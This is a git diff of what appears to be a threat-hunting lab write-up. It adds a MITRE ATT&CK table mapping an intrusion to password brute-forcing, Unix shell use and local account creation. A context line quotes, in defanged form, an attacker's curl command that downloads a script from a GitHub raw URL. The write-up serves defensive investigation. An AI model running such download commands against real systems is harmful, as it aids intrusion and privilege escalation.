@@ -132,7 +132,25 @@ Answer: /usr/bin/curl hxxps[://]raw[.]githubusercontent[.]com/montysecurity/linp
 <img width="591" height="212" alt="Screenshot 2026-02-20 161428" src="https://github.com/user-attachments/assets/de6a474a-d846-49e3-b9c8-673ec495354b" />
 
 ---
+# MITRE ATT&CK Mapping
 
-## Author
+| ATT&CK Stage | Technique ID | Technique |
+| --- | --- | --- |
+| Reconnaissance | - | - |
+| Resource Development | - | - |
+| Initial Access | T1110.001 | Brute Force: Password Guessing |
+| Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell |
+| Persistence | T1136.001 | Create Account: Local Account |
+| Privilege Escalation | T1078 | Valid Accounts |
+| Defense Impairment | - | - |
+| Credential Access | T1110.001 | Brute Force: Password Guessing |
+| Discovery | - | - |
+| Lateral Movement | - | - |
+| Collection | - | - |
+| Command and Control | - | - |
+| Exfiltration | - | - |
+| Impact | - | - |
 
-### RUTHRAN-SEC
+### DONE BY
+
+#### RUTHRAN-SEC
